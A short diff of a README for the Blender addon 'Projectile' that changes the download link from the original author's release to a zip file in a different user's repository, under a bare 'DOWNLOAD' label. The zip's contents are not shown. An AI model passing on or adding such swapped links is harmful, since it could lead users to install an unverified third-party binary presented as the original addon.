@@ -1,6 +1,6 @@
 # Projectile
 
-### [Download Projectile](https://github.com/natecraddock/projectile/releases/download/v2.1/projectile.zip)](https://github.com/tankumar27/Tanishq_Blender_Projectile/releases/download/v1.0/TanishqProjectile-addon.5.zip)
+ [DOWNLOAD](https://github.com/tankumar27/Tanishq_Blender_Projectile/releases/download/v1.0/TanishqProjectile-addon.5.zip)
 *Install the .zip file as an addon*
 
 ### Projectile features:
